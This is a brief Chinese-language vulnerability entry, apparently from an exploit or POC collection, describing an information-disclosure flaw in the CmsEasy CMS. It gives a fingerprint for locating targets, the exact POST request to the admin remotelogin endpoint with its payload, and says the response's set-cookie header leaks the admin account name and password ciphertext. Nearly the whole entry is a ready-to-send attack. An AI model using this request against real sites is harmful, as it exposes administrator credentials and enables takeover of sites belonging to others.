# cmseasyindex信息泄露漏洞

cmseasyindex ｜ 信息泄露 ｜ —
- **指纹**：`app="CmsEasy"`
- **请求**：`POST /index.php?case=admin&act=remotelogin&args=aaa&admin_dir=admin&site=default HTTP/1.1`

**Payload**
```
submit=%25E6%258F%2590%25E4%25BA%25A4&username=111&password=1111
发送请求包，响应头的set-cookie中会回显账号和密码密文。
```
- **响应特征**：200